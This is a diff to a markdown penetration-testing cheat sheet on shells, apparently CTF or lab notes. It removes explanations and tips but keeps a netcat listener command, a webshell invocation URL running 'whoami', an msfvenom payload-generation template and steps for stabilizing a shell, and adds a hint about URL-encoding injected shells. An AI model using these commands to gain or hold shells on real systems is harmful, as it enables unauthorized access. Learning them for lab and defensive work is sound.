@@ -1,8 +1,6 @@
 # Shells
 
-> Turn "I can run commands on the target" into "I have an interactive shell."
-> The listener always runs on **your attacker box**; the target connects back
-> to you (reverse), or you connect in (bind).
+> How to establish an initial foothold.
 
 ## Shell Types
 
@@ -12,20 +10,7 @@
 | **bind** | target | attacker → target | needs an inbound-reachable target port |
 | **webshell** | — | — | half-interactive; run commands via a web app, output on the page |
 
-## Know Your Own IP
-
-> to build a reverse-shell payload you need YOUR attacker IP and a listening port.
-
-| command | usage |
-| ------- | ----- |
-| `ip -br a` | your interfaces / IPs (short) |
-| `ip a` | full interface details |
-
-> the target calls back to `<your-ip>:<port>`.
-
 ## Catching a Reverse Shell
-
-> run the listener on your attacker box:
 
 ```
 nc -lnvp <port>
@@ -38,7 +23,7 @@ nc -lnvp <port>
 | `-v` | verbose |
 | `-p <port>` | port to listen on |
 
-> pick a port you control (e.g. 4444, 9001); the payload must point at this same port.
+> ports 0-1023 are root user only; use 1024 or higher
 
 ## Creating Reverse Shells
 
@@ -61,7 +46,7 @@ nc -lnvp <port>
 | `http://<target>/<path>/shell.php?cmd=whoami` | invoke it |
 | `webshells` | list bundled webshells (`/usr/share/webshells/`) |
 
-> bundled languages: asp, aspx, cfm, jsp, perl, php, ...
+> remember to URL encode when injecting shells through a URL
 
 ## msfvenom (payload generator)
 
@@ -89,10 +74,6 @@ msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <outfile>
 | 2. background | attacker | press `CTRL+Z` |
 | 3. raw mode + resume | attacker | `stty raw -echo; fg` then Enter |
 | 4. set terminal type | target | `export TERM=xterm-256color` |
-| 5. fix size (optional) | target | `stty rows <N> cols <M>` |
-
-> get your real size on the attacker with `stty -a` (look for rows/columns).
-> `stty raw -echo` passes keystrokes straight through (CTRL+C now reaches the target).
 
 ## Stabilizing a Shell (Windows)
 
@@ -102,19 +83,3 @@ msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <outfile>
 sudo apt install rlwrap -y
 rlwrap nc -lnvp <port>
 ```
-
-## Quick Recovery
-
-| problem | fix |
-| ------- | --- |
-| shell froze after CTRL+Z didn't resume | type `reset` and Enter |
-| garbled / no newlines | redo `export TERM=xterm-256color` and the `stty` size step |
-| CTRL+C killed your whole shell | you forgot `stty raw -echo` — stabilize before working |
-
-## General Tips
-
-- The listener is always on **your** box; the payload always points back at you.
-- Stabilize the shell **before** doing real work, so CTRL+C doesn't kill it.
-- If a one-liner fails silently, switch languages (bash → python → nc) — tooling varies.
-- Keep `revshells.com` open; it generates both the payload and the matching listener.
-- Note your IP/port once and reuse them consistently to avoid mismatches.
